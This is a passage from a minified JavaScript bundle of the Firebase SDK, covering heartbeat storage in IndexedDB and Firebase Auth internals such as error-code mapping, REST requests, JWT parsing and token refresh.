 */const GU="firebase-heartbeat-database",QU=1,Ku="firebase-heartbeat-store";let Mm=null;function _2(){return Mm||(Mm=fU(GU,QU,{upgrade:(n,e)=>{switch(e){case 0:try{n.createObjectStore(Ku)}catch(t){console.warn(t)}}}}).catch(n=>{throw ao.create("idb-open",{originalErrorMessage:n.message})})),Mm}async function YU(n){try{const t=(await _2()).transaction(Ku),r=await t.objectStore(Ku).get(E2(n));return await t.done,r}catch(e){if(e instanceof Es)gs.warn(e.message);else{const t=ao.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});gs.warn(t.message)}}}async function hI(n,e){try{const r=(await _2()).transaction(Ku,"readwrite");await r.objectStore(Ku).put(e,E2(n)),await r.done}catch(t){if(t instanceof Es)gs.warn(t.message);else{const r=ao.create("idb-set",{originalErrorMessage:t==null?void 0:t.message});gs.warn(r.message)}}}function E2(n){return`${n.name}!${n.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ZU=1024,JU=30;class XU{constructor(e){this.container=e,this._heartbeatsCache=null;const t=this.container.getProvider("app").getImmediate();this._storage=new t8(t),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){var e,t;try{const i=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),s=fI();if(((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((t=this._heartbeatsCache)===null||t===void 0?void 0:t.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===s||this._heartbeatsCache.heartbeats.some(o=>o.date===s))return;if(this._heartbeatsCache.heartbeats.push({date:s,agent:i}),this._heartbeatsCache.heartbeats.length>JU){const o=n8(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(o,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(r){gs.warn(r)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const t=fI(),{heartbeatsToSend:r,unsentEntries:i}=e8(this._heartbeatsCache.heartbeats),s=Dd(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=t,i.length>0?(this._heartbeatsCache.heartbeats=i,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),s}catch(t){return gs.warn(t),""}}}function fI(){return new Date().toISOString().substring(0,10)}function e8(n,e=ZU){const t=[];let r=n.slice();for(const i of n){const s=t.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),dI(t)>e){s.dates.pop();break}}else if(t.push({agent:i.agent,dates:[i.date]}),dI(t)>e){t.pop();break}r=r.slice(1)}return{heartbeatsToSend:t,unsentEntries:r}}class t8{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return F5()?z5().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const t=await YU(this.app);return t!=null&&t.heartbeats?t:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var t;if(await this._canUseIndexedDBPromise){const i=await this.read();return hI(this.app,{lastSentHeartbeatDate:(t=e.lastSentHeartbeatDate)!==null&&t!==void 0?t:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var t;if(await this._canUseIndexedDBPromise){const i=await this.read();return hI(this.app,{lastSentHeartbeatDate:(t=e.lastSentHeartbeatDate)!==null&&t!==void 0?t:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return}}function dI(n){return Dd(JSON.stringify({version:2,heartbeats:n})).length}function n8(n){if(n.length===0)return-1;let e=0,t=n[0].date;for(let r=1;r<n.length;r++)n[r].date<t&&(t=n[r].date,e=r);return e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function r8(n){Hl(new pa("platform-logger",e=>new gU(e),"PRIVATE")),Hl(new pa("heartbeat",e=>new XU(e),"PRIVATE")),lo(yy,cI,n),lo(yy,cI,"esm2017"),lo("fire-js","")}r8("");function Tv(n,e){var t={};for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&e.indexOf(r)<0&&(t[r]=n[r]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(n);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(n,r[i])&&(t[r[i]]=n[r[i]]);return t}function I2(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const i8=I2,S2=new mh("auth","Firebase",I2());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Bd=new Ev("@firebase/auth");function s8(n,...e){Bd.logLevel<=Qe.WARN&&Bd.warn(`Auth (${uc}): ${n}`,...e)}function jf(n,...e){Bd.logLevel<=Qe.ERROR&&Bd.error(`Auth (${uc}): ${n}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function mi(n,...e){throw Av(n,...e)}function ki(n,...e){return Av(n,...e)}function T2(n,e,t){const r=Object.assign(Object.assign({},i8()),{[e]:t});return new mh("auth","Firebase",r).create(e,{appName:n.name})}function co(n){return T2(n,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function Av(n,...e){if(typeof n!="string"){const t=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=n.name),n._errorFactory.create(t,...r)}return S2.create(n,...e)}function Me(n,e,...t){if(!n)throw Av(e,...t)}function rs(n){const e="INTERNAL ASSERTION FAILED: "+n;throw jf(e),new Error(e)}function ms(n,e){n||rs(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _y(){var n;return typeof self<"u"&&((n=self.location)===null||n===void 0?void 0:n.href)||""}function o8(){return pI()==="http:"||pI()==="https:"}function pI(){var n;return typeof self<"u"&&((n=self.location)===null||n===void 0?void 0:n.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function a8(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(o8()||B5()||"connection"in navigator)?navigator.onLine:!0}function l8(){if(typeof navigator>"u")return null;const n=navigator;return n.languages&&n.languages[0]||n.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wh{constructor(e,t){this.shortDelay=e,this.longDelay=t,ms(t>e,"Short delay should be less than long delay!"),this.isMobile=L5()||U5()}get(){return a8()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bv(n,e){ms(n.emulator,"Emulator should always be set here");const{url:t}=n.emulator;return e?`${t}${e.startsWith("/")?e.slice(1):e}`:t}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class A2{static initialize(e,t,r){this.fetchImpl=e,t&&(this.headersImpl=t),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;rs("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;rs("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;rs("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const c8={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const u8=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],h8=new wh(3e4,6e4);function ba(n,e){return n.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:n.tenantId}):e}async function bo(n,e,t,r,i={}){return b2(n,i,async()=>{let s={},o={};r&&(e==="GET"?o=r:s={body:JSON.stringify(r)});const a=yh(Object.assign({key:n.config.apiKey},o)).slice(1),l=await n._getAdditionalHeaders();l["Content-Type"]="application/json",n.languageCode&&(l["X-Firebase-Locale"]=n.languageCode);const u=Object.assign({method:e,headers:l},s);return O5()||(u.referrerPolicy="no-referrer"),A2.fetch()(await x2(n,n.config.apiHost,t,a),u)})}async function b2(n,e,t){n._canInitEmulator=!1;const r=Object.assign(Object.assign({},c8),e);try{const i=new d8(n),s=await Promise.race([t(),i.promise]);i.clearNetworkTimeout();const o=await s.json();if("needConfirmation"in o)throw pf(n,"account-exists-with-different-credential",o);if(s.ok&&!("errorMessage"in o))return o;{const a=s.ok?o.errorMessage:o.error.message,[l,u]=a.split(" : ");if(l==="FEDERATED_USER_ID_ALREADY_LINKED")throw pf(n,"credential-already-in-use",o);if(l==="EMAIL_EXISTS")throw pf(n,"email-already-in-use",o);if(l==="USER_DISABLED")throw pf(n,"user-disabled",o);const h=r[l]||l.toLowerCase().replace(/[_\s]+/g,"-");if(u)throw T2(n,h,u);mi(n,h)}}catch(i){if(i instanceof Es)throw i;mi(n,"network-request-failed",{message:String(i)})}}async function qp(n,e,t,r,i={}){const s=await bo(n,e,t,r,i);return"mfaPendingCredential"in s&&mi(n,"multi-factor-auth-required",{_serverResponse:s}),s}async function x2(n,e,t,r){const i=`${e}${t}?${r}`,s=n,o=s.config.emulator?bv(n.config,i):`${n.config.apiScheme}://${i}`;return u8.includes(t)&&(await s._persistenceManagerAvailable,s._getPersistenceType()==="COOKIE")?s._getPersistence()._getFinalTarget(o).toString():o}function f8(n){switch(n){case"ENFORCE":return"ENFORCE";case"AUDIT":return"AUDIT";case"OFF":return"OFF";default:return"ENFORCEMENT_STATE_UNSPECIFIED"}}class d8{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((t,r)=>{this.timer=setTimeout(()=>r(ki(this.auth,"network-request-failed")),h8.get())})}}function pf(n,e,t){const r={appName:n.name};t.email&&(r.email=t.email),t.phoneNumber&&(r.phoneNumber=t.phoneNumber);const i=ki(n,e,r);return i.customData._tokenResponse=t,i}function gI(n){return n!==void 0&&n.enterprise!==void 0}class p8{constructor(e){if(this.siteKey="",this.recaptchaEnforcementState=[],e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.recaptchaEnforcementState=e.recaptchaEnforcementState}getProviderEnforcementState(e){if(!this.recaptchaEnforcementState||this.recaptchaEnforcementState.length===0)return null;for(const t of this.recaptchaEnforcementState)if(t.provider&&t.provider===e)return f8(t.enforcementState);return null}isProviderEnabled(e){return this.getProviderEnforcementState(e)==="ENFORCE"||this.getProviderEnforcementState(e)==="AUDIT"}isAnyProviderEnabled(){return this.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")||this.isProviderEnabled("PHONE_PROVIDER")}}async function g8(n,e){return bo(n,"GET","/v2/recaptchaConfig",ba(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function m8(n,e){return bo(n,"POST","/v1/accounts:delete",e)}async function Ud(n,e){return bo(n,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function pu(n){if(n)try{const e=new Date(Number(n));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function y8(n,e=!1){const t=xn(n),r=await t.getIdToken(e),i=xv(r);Me(i&&i.exp&&i.auth_time&&i.iat,t.auth,"internal-error");const s=typeof i.firebase=="object"?i.firebase:void 0,o=s==null?void 0:s.sign_in_provider;return{claims:i,token:r,authTime:pu(Nm(i.auth_time)),issuedAtTime:pu(Nm(i.iat)),expirationTime:pu(Nm(i.exp)),signInProvider:o||null,signInSecondFactor:(s==null?void 0:s.sign_in_second_factor)||null}}function Nm(n){return Number(n)*1e3}function xv(n){const[e,t,r]=n.split(".");if(e===void 0||t===void 0||r===void 0)return jf("JWT malformed, contained fewer than 3 sections"),null;try{const i=d2(t);return i?JSON.parse(i):(jf("Failed to decode base64 JWT payload"),null)}catch(i){return jf("Caught error parsing JWT payload as JSON",i==null?void 0:i.toString()),null}}function mI(n){const e=xv(n);return Me(e,"internal-error"),Me(typeof e.exp<"u","internal-error"),Me(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Gu(n,e,t=!1){if(t)return e;try{return await e}catch(r){throw r instanceof Es&&w8(r)&&n.auth.currentUser===n&&await n.auth.signOut(),r}}function w8({code:n}){return n==="auth/user-disabled"||n==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class v8{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var t;if(e){const r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;const i=((t=this.user.stsTokenManager.expirationTime)!==null&&t!==void 0?t:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;const t=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},t)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ey{constructor(e,t){this.createdAt=e,this.lastLoginAt=t,this._initializeTime()}_initializeTime(){this.lastSignInTime=pu(this.lastLoginAt),this.creationTime=pu(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function jd(n){var e;const t=n.auth,r=await n.getIdToken(),i=await Gu(n,Ud(t,{idToken:r}));Me(i==null?void 0:i.users.length,t,"internal-error");const s=i.users[0];n._notifyReloadListener(s);const o=!((e=s.providerUserInfo)===null||e===void 0)&&e.length?k2(s.providerUserInfo):[],a=E8(n.providerData,o),l=n.isAnonymous,u=!(n.email&&s.passwordHash)&&!(a!=null&&a.length),h=l?u:!1,f={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:a,metadata:new Ey(s.createdAt,s.lastLoginAt),isAnonymous:h};Object.assign(n,f)}async function _8(n){const e=xn(n);await jd(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function E8(n,e){return[...n.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function k2(n){return n.map(e=>{var{providerId:t}=e,r=Tv(e,["providerId"]);return{providerId:t,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function I8(n,e){const t=await b2(n,{},async()=>{const r=yh({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:s}=n.config,o=await x2(n,i,"/v1/token",`key=${s}`),a=await n._getAdditionalHeaders();return a["Content-Type"]="application/x-www-form-urlencoded",A2.fetch()(o,{method:"POST",headers:a,body:r})});return{accessToken:t.access_token,expiresIn:t.expires_in,refreshToken:t.refresh_token}}async function S8(n,e){return bo(n,"POST","/v2/accounts:revokeToken",ba(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Tl{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){Me(e.idToken,"internal-error"),Me(typeof e.idToken<"u","internal-error"),Me(typeof e.refreshToken<"u","internal-error");const t="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):mI(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,t)}updateFromIdToken(e){Me(e.length!==0,"internal-error");const t=mI(e);this.updateTokensAndExpiration(e,null,t)}async getToken(e,t=!1){return!t&&this.accessToken&&!this.isExpired?this.accessToken:(Me(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,t){const{accessToken:r,refreshToken:i,expiresIn:s}=await I8(e,t);this.updateTokensAndExpiration(r,i,Number(s))}updateTokensAndExpiration(e,t,r){this.refreshToken=t||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,t){const{refreshToken:r,accessToken:i,expirationTime:s}=t,o=new Tl;return r&&(Me(typeof r=="string","internal-error",{appName:e}),o.refreshToken=r),i&&(Me(typeof i=="string","internal-error",{appName:e}),o.accessToken=i),s&&(Me(typeof s=="number","internal-error",{appName:e}),o.expirationTime=s),o}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new Tl,this.toJSON())}_performRefresh(){return rs("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
